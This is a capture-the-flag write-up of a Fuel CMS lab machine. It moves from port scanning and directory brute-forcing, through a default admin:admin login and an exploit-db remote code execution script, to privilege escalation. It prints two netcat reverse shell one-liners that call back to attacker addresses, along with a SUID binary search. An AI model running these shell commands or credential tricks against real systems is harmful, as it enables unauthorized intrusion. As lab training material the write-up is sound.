# Step 1: Enumeration
## Scan
### Nmap
```
nmap -sS -A -T4 -e tun0 -oN nmap.log 10.10.233.31
```
#### Result
```
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
```

### Masscan
```
masscan -e tun0 --rate 1000 -p0-65535 -oL masscan.log 10.10.233.31
```
#### Result
```
open tcp 80 10.10.233.31 1601794104
```

It appears only port 80 is open on the server. Time to spider the site.

### OWASP Zap

robots.txt includes /fuel/, maybe there's something they don't want use to see?
Fuel appears to be CMS, perhaps should try brute-forcing our way in if we don't
find anything via /fuel/login.

### GoBuster

Nothing too interesting was found by spidering the site, let's look for hidden
directories.

```
gobuster dir -u http://10.10.233.31 -o gobuster.log -w /usr/share/wordlists/discovery/common.txt
```
#### Result (urls of interest)
```
/home
/offline
```

/home seems to be the default template/setup page for fuel cms. Looking at it's contents
there is an insert about the default login being admin:admin. Let's try logging in with that.
That worked.

# Step 2: Exploitation

Now that we're in, let's try to get a shell. Upload php-reverse-shell.php to the server
under assets, then start ncat and navigate to the resource to trigger it.

.php files can't be uploaded, let's try changing the extension. That doesn't work either.
Trying to edit a page and paste in the shell code also doesn't work because it gets cleaned.

After spending an hour trying to figure out how to get the reverse shell onto the server,
I needed to reference a writeup. Turns out trying to do that won't work. Instead there is
a script found on exploit-db that allows for remote code execution against fuel cms.

Unfortunately, the script didn't work. I ported it over to python3, but that wasn't enough.
I had to look through a few different writeups to find a working version of the script.
What the author had done is removed the proxy call, from there it worked like a charm.

Once the script was working, I started up ncat again on my host machine, and executed the cmd:
```
cmd:nc 10.4.15.69 4444 -e /bin/bash
```

Now I have a shell. Or at least I thought so. Turns out I need to do some wild shit.
```
rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.6.159 1337 >/tmp/f
```

After running that monstrosity, I upgrade the shell:
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

Then I checked out the /home directory and got the flag.

# Step 3: Escalation

Now I needed to find a way to escalate permissions. From the previous rooms I've done,
I know I can look for binaries with root permissions.
```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

Unfortunately, it seems none of the binaries were exploitable. Again, I had to
reference a writeup. The writeup revealed that root's password was saved as
plain text in a config file that was part of fuel cms. This could've been
deduced had I carefully read the /home page contents and kept note of it.

After upgrading to root, I grabbed the flag in /root.
